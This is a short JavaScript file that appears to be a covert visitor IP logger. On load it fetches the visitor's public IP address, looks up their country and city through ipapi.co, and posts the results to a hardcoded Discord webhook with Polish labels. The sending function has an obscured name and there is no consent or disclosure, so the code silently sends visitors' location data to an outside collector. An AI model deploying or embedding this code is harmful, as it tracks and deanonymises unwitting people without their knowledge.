var a = new XMLHttpRequest();

function rqwbm(url,datax) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST",url,true);
    xhr.setRequestHeader("Content-Type","application/json");
    xhr.send(datax);
}

a.open("GET","https://api.ipify.org");

a.onreadystatechange = function() {
    if (this.readyState === 4) {
        const res1 = this.responseText;
        var country = new XMLHttpRequest();
        country.open("GET","https://ipapi.co/"+res1+"/country_name");
        country.onreadystatechange = function() {
            if (this.readyState === 4) {
                var res2 = this.responseText;
                var city = new XMLHttpRequest();
                city.open("GET","https://ipapi.co/"+res1+"/city");
                city.onreadystatechange = function() {
                    if (this.readyState === 4) {
                        var res3 = this.responseText;
                        rqwbm("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",JSON.stringify({"content":"**IP: "+res1+"\nKraj: "+res2+"\nMiasto: "+res3+"**"}))
                    }
                }
                city.send();
            }
        }
        country.send();
    }
}

a.send();
